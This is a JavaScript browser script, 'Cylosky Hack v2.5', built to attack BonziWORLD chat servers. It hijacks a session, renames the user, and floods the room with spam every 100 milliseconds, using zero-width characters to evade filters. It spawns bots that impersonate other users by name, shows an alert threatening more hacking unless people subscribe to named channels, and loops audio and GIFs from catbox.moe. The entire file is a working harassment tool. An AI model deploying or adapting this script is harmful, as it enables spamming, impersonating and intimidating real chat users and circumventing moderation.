// Cylosky Hack Script v2.5 - External Media Integration (Catbox.moe GIF + Creepy Audio)
(() => {
  // Import BonziData structure from bonzi.gay
  const BonziData = {
    colors: ["black", "blue", "brown", "cyan", "green", "pink", "purple", "red", "white", "yellow", "blessed", "noob", "glow", "pope"],
    hats: ["bear", "bfdi", "bieber", "bowtie", "bucket", "chain", "cigar", "dank", "elon", "evil", "horse", "illuminati", "kamala", "king", "maga", "obama", "pot", "propeller", "tophat", "troll", "truck", "witch", "wizard"]
  };
  
  // Custom Target Server URL (leave empty to auto-detect current BonziWORLD server)
  // Must be a BonziWORLD server (must contain "bonzi")
  // Examples: "https://bonzi.gay", "https://bonziworld.org", "https://bw.gay"
  const customServerUrl = ""; // Edit this to use a different BonziWORLD server
  
  // Configuration
  const config = {
    controlBots: 5, // Number of control bots to spawn
    messageInterval: 100,
    crashHandling: true,
    advancedBypass: true,
    userImpersonation: true,
    autoReconnect: true,
    externalImage: "https://files.catbox.moe/fxjeps.gif", // Catbox.moe GIF
    creepyAudio: "https://files.catbox.moe/52h49r.mp3" // Catbox.moe creepy audio
  };
  
  // Advanced bypass characters
  const ZERO_WIDTH_CHARS = ['\u200B', '\u200C', '\u200D', '\uFEFF'];
  const INVISIBLE_CHARS = ['\u2800', '\u180E', '\u2063'];
  const MIXED_CHARS = ['\u00A0', '\u2009', '\u200A'];
  
  // State tracking
  let detectedUsers = new Set();
  let userGUIDs = new Map();
  let bypassCounter = 0;
  let colorChangeCount = 0;
  let controlBots = [];
  let isActive = true;
  let currentRoom = "default"; // Track the current room
  let audioElement = null; // Track audio element
  
  // Validate BonziWORLD server URL
  function validateServerUrl(url) {
    if (!url || url.trim() === '') {
      return { valid: false, message: 'Server URL cannot be empty' };
    }
    
    const trimmedUrl = url.trim();
    
    if (!trimmedUrl.toLowerCase().includes('bonzi')) {
      return { valid: false, message: 'Only BonziWORLD server URLs are allowed (must contain "bonzi")' };
    }
    
    try {
      const urlObj = new URL(trimmedUrl);
      if (!urlObj.protocol.startsWith('http')) {
        return { valid: false, message: 'URL must use HTTP or HTTPS protocol' };
      }
      return { valid: true, url: trimmedUrl };
    } catch (e) {
      return { valid: false, message: 'Invalid URL format' };
    }
  }

  // Auto-detect and validate BonziWORLD server URL
  function detectServerUrl() {
    // First, check if custom URL is provided
    if (customServerUrl && customServerUrl.trim() !== '') {
      const validation = validateServerUrl(customServerUrl);
      if (validation.valid) {
        console.log(`[CYLOSKY] Using custom server: ${validation.url}`);
        return validation.url;
      } else {
        console.error(`[CYLOSKY] Invalid custom server URL: ${validation.message}`);
        console.log(`[CYLOSKY] Falling back to auto-detection`);
      }
    }
    
    // Auto-detect from current page
    const currentOrigin = window.location.origin;
    const currentHost = window.location.hostname;
    
    if (currentHost.includes('bonzi')) {
      console.log(`[CYLOSKY] Auto-detected server: ${currentOrigin}`);
      return currentOrigin;
    }
    
    console.log(`[CYLOSKY] Using default server: https://bonzi.gay`);
    return 'https://bonzi.gay';
  }
  
  const targetServerUrl = detectServerUrl();
  console.log(`%c[CYLOSKY] Target Server: ${targetServerUrl}`, 'color: #00ff00; font-weight: bold;');
  
  // Random selection helpers
  function randomColor() {
    return BonziData.colors[Math.floor(Math.random() * BonziData.colors.length)];
  }
  
  function randomHat() {
    return BonziData.hats[Math.floor(Math.random() * BonziData.hats.length)];
  }
  
  // Advanced bypass string generator
  function getAdvancedBypass(count) {
    const method = count % 4;
    const random = Math.floor(Math.random() * 721);
    
    switch(method) {
      case 0:
        return ZERO_WIDTH_CHARS[count % ZERO_WIDTH_CHARS.length].repeat((count % 3) + 1) + random;
      case 1:
        return INVISIBLE_CHARS[count % INVISIBLE_CHARS.length].repeat((count % 2) + 1) + random;
      case 2:
        return MIXED_CHARS[count % MIXED_CHARS.length] + random;
      case 3:
      default:
        return '-'.repeat(count % 8) + random;
    }
  }
  
  // Crash handling wrapper
  function safeEmit(socket, event, data) {
    if (!config.crashHandling) {
      socket.emit(event, data);
      return;
    }
    
    try {
      if (socket && socket.connected) {
        socket.emit(event, data);
      }
    } catch (error) {
      console.error(`[CRASH PREVENTED] Error emitting ${event}:`, error.message);
    }
  }
  
  // Initialize creepy audio with auto-loop and error handling
  function initCreepyAudio() {
    try {
      // Remove existing audio if present
      if (audioElement) {
        audioElement.pause();
        audioElement.remove();
      }
      
      // Create new audio element
      audioElement = document.createElement('audio');
      audioElement.src = config.creepyAudio;
      audioElement.loop = true; // Loop continuously
      audioElement.volume = 0.8; // 80% volume
      audioElement.autoplay = true;
      audioElement.style.display = 'none'; // Hide audio element
      
      // Error handling for audio loading
      audioElement.addEventListener('error', (e) => {
        console.error('[AUDIO ERROR] Failed to load creepy audio:', e);
      });
      
      audioElement.addEventListener('canplay', () => {
        console.log('%c🔊 Creepy audio loaded successfully!', 'color: #00ff00; font-weight: bold;');
      });
      
      // Append to body
      document.body.appendChild(audioElement);
      
      // Try to play (browsers may block autoplay)
      audioElement.play().then(() => {
        console.log('%c🎵 Creepy audio playing!', 'color: #ff0000; font-weight: bold;');
      }).catch((error) => {
        console.warn('[AUTOPLAY BLOCKED] User interaction required to play audio:', error);
        // Try again on user interaction
        document.addEventListener('click', () => {
          audioElement.play().catch(e => console.error('Failed to play on click:', e));
        }, { once: true });
      });
      
    } catch (error) {
      console.error('[CRASH PREVENTED] Audio initialization error:', error);
    }
  }
  
  // Create control bot for user impersonation
  function createControlBot(userId, userName, userColor, userHat, roomName) {
    try {
      if (typeof io === "undefined") {
        console.error("Socket.io not available for control bots");
        return null;
      }
      
      const botSocket = io(targetServerUrl, {
        forceNew: true,
        reconnection: config.autoReconnect,
        reconnectionDelay: 1000 + Math.random() * 2000,
        reconnectionAttempts: 10,
        timeout: 20000,
        transports: ['websocket', 'polling']
      });
      
      botSocket.on('connect', () => {
        console.log(`✓ Control bot impersonating: ${userName} in room: ${roomName}`);
        
        safeEmit(botSocket, "client", "MAIN");
        safeEmit(botSocket, "login", {
          passcode: "",
          name: userName,
          room: roomName || currentRoom
        });
        
        safeEmit(botSocket, "command", { list: ["color", userColor || randomColor()] });
        safeEmit(botSocket, "command", { list: ["hat", userHat || randomHat()] });
        
        // Control bot behavior - mimic and spam
        let botBypassCount = 0;
        const botInterval = setInterval(() => {
          if (!isActive || !botSocket.connected) {
            clearInterval(botInterval);
            return;
          }
          
          const bypass = getAdvancedBypass(botBypassCount);
          const controlMessages = [
            `HACKED BY CYLOSKY! SUB TO LOSKYTHECOPYDOG77 AND CYANPIXAR ${bypass}`,
            `I AM CONTROLLED! CYLOSKY VIRUS ACTIVE ${bypass}`,
            `CYAN PIXAR LOSKY TOOK CONTROL ${bypass}`,
            `THIS IS NOT ME! HACKED! ${bypass}`,
            `HELP! CYLOSKY VIRUS! ${bypass}`
          ];
          
          safeEmit(botSocket, 'talk', {
            text: controlMessages[botBypassCount % controlMessages.length]
          });
          
          botBypassCount++;
          
          // Random appearance changes
          if (botBypassCount % 10 === 0) {
            safeEmit(botSocket, "command", { list: ["color", randomColor()] });
            safeEmit(botSocket, "command", { list: ["hat", randomHat()] });
          }
        }, 500 + Math.random() * 500);
      });
      
      botSocket.on('error', (error) => {
        console.error(`Control bot error:`, error);
      });
      
      botSocket.on('disconnect', (reason) => {
        console.log(`Control bot disconnected: ${reason}`);
        if (config.autoReconnect && isActive) {
          setTimeout(() => botSocket.connect(), 2000 + Math.random() * 2000);
        }
      });
      
      return botSocket;
    } catch (error) {
      console.error(`Failed to create control bot:`, error);
      return null;
    }
  }
  
  // Initialize main hack
  try {
    // Initialize creepy audio FIRST
    initCreepyAudio();
    
    // Trigger the YouTube video
    safeEmit(socket, 'command', {
      list: ['youtube', '8VWjG8PwPLw']
    });
    
    alert('congratulations, you got hacked, now your punishment is to SUB TO LOSKYTHECOPYDOG77 AND CYANPIXAR NOOOOOOW! if you dont, or block losky and Cyanpixar, or report both, you will get hacked again!'); 
    
    // Listen for room updates to detect and control users
    socket.on('room', (data) => {
      try {
        if (data) {
          // Update current room name if available
          if (data.room) {
            currentRoom = data.room;
            console.log(`📍 Current room: ${currentRoom}`);
          }
          
          if (data.users) {
            Object.keys(data.users).forEach(userId => {
              const user = data.users[userId];
              if (user && user.name && user.name !== 'HACKED BY CYLOSKY VIRUS') {
                detectedUsers.add(user.name);
                userGUIDs.set(userId, {
                  name: user.name,
                  color: user.color,
                  hat: user.hat
                });
                console.log('🎯 Detected user:', user.name);
                
                // Create control bot for this user if enabled and not already controlling
                if (config.userImpersonation && controlBots.length < config.controlBots) {
                  const controlBot = createControlBot(userId, user.name, user.color, user.hat, currentRoom);
                  if (controlBot) {
                    controlBots.push(controlBot);
                  }
                }
              }
            });
          }
        }
      } catch (error) {
        console.error('[CRASH PREVENTED] Room handler error:', error);
      }
    });
    
    // Main flooding interval with crash protection
    const mainInterval = setInterval(function() {
      try {
        if (!isActive) {
          clearInterval(mainInterval);
          return;
        }
        
        // Visual takeover with catbox.moe GIF
        try {
          document.title = 'SUB TO LOSKYTHECOPYDOG77 AND CYANPIXAR NOW!!';
          const contentEl = document.getElementById('content');
          if (contentEl) {
            // Use the catbox.moe GIF as background
            contentEl.style.backgroundImage = `url(${config.externalImage})`;
            contentEl.style.backgroundRepeat = 'repeat';
            contentEl.style.backgroundSize = 'auto'; // Keep original size for tiling
          }
        } catch (error) {
          console.error('[CRASH PREVENTED] DOM manipulation error:', error);
        }
        
        // Main user takeover
        safeEmit(socket, 'command', {list: ['name', 'HACKED BY CYLOSKY VIRUS']});
        
        // Rapidly cycle through colors and hats for maximum chaos
        colorChangeCount++;
        if (colorChangeCount % 2 === 0) {
          safeEmit(socket, 'command', {list: ['color', randomColor()]});
          safeEmit(socket, 'command', {list: ['hat', randomHat()]});
        }
        
        // Generate advanced bypass
        const bypass = config.advancedBypass 
          ? getAdvancedBypass(bypassCounter) 
          : '-'.repeat(bypassCounter % 10);
        
        let floodMessage = 'CYAN PIXAR LOSKY CYAN PIXAR LOSKY CYAN PIXAR LOSKY CYAN PIXAR LOSKY CYAN PIXAR LOSKY CYAN PIXAR LOSKY CYAN PIXAR LOSKY CYANPIXAR LOSKY ' + bypass;
        
        // Tag all detected users
        if (detectedUsers.size > 0) {
          const userList = Array.from(detectedUsers).join(' @');
          floodMessage = `@${userList} ` + floodMessage;
        }
        
        safeEmit(socket, 'talk', {text: floodMessage});
        bypassCounter++;
        
        // Occasionally trigger commands for extra chaos
        if (bypassCounter % 20 === 0) {
          const chaoticCommands = [
            ['asshole'],
            ['fact'],
            ['joke'],
            ['insult']
          ];
          const randomCmd = chaoticCommands[Math.floor(Math.random() * chaoticCommands.length)];
          safeEmit(socket, 'command', {list: randomCmd});
        }
        
      } catch (error) {
        console.error('[CRASH PREVENTED] Main loop error:', error);
      }
    }, config.messageInterval);
    
    // Cleanup handler
    window.addEventListener('beforeunload', () => {
      isActive = false;
      
      // Stop audio
      if (audioElement) {
        try {
          audioElement.pause();
          audioElement.remove();
        } catch (error) {
          console.error('Audio cleanup error:', error);
        }
      }
      
      // Disconnect all control bots
      controlBots.forEach(bot => {
        try {
          if (bot && bot.connected) {
            bot.disconnect();
          }
        } catch (error) {
          console.error('Bot cleanup error:', error);
        }
      });
    });
    
    console.log("%c🔥 CYLOSKY HACK v2.5 ACTIVATED 🔥", "color: #ff0000; font-weight: bold; font-size: 18px;");
    console.log("%c✓ BonziData integration: ENABLED", "color: #00ff00; font-size: 14px;");
    console.log("%c✓ Advanced bypass (4 methods): ENABLED", "color: #00ff00; font-size: 14px;");
    console.log("%c✓ User detection: ENABLED", "color: #00ff00; font-size: 14px;");
    console.log("%c✓ Bot control system: ENABLED", "color: #00ff00; font-size: 14px;");
    console.log(`%c✓ Control bots: ${config.controlBots} bots will impersonate users`, "color: #00ff00; font-size: 14px;");
    console.log("%c✓ Crash handling: ENABLED", "color: #00ff00; font-size: 14px;");
    console.log("%c✓ Auto-reconnect: ENABLED", "color: #00ff00; font-size: 14px;");
    console.log("%c✓ Color/Hat randomization: ENABLED", "color: #00ff00; font-size: 14px;");
    console.log("%c✓ Chaotic commands: ENABLED", "color: #00ff00; font-size: 14px;");
    console.log(`%c✓ External GIF: ${config.externalImage}`, "color: #00ff00; font-size: 14px;");
    console.log(`%c🔊 Creepy audio: ${config.creepyAudio} (LOOPING)`, "color: #ff0000; font-weight: bold; font-size: 14px;");
    console.log("%cReady to flood with MAXIMUM CHAOS + CREEPY VIBES! 👻🎭", "color: #ff9900; font-weight: bold; font-size: 14px;");
    console.log(`%cControl bots will spawn to impersonate detected users!`, "color: #ff0000; font-weight: bold; font-size: 14px;");
    
  } catch (error) {
    console.error('[CRITICAL ERROR] Failed to initialize Cylosky Hack v2.5:', error);
    alert('Hack initialization failed. Check console for details.');
  }
  
  // Expose stop function for emergency shutdown
  window.stopCyloskyHack = () => {
    isActive = false;
    if (audioElement) {
      audioElement.pause();
      audioElement.remove();
    }
    console.log('%cCYLOSKY HACK v2.5 STOPPED', 'color: #ff0000; font-weight: bold;');
  };
  
})();
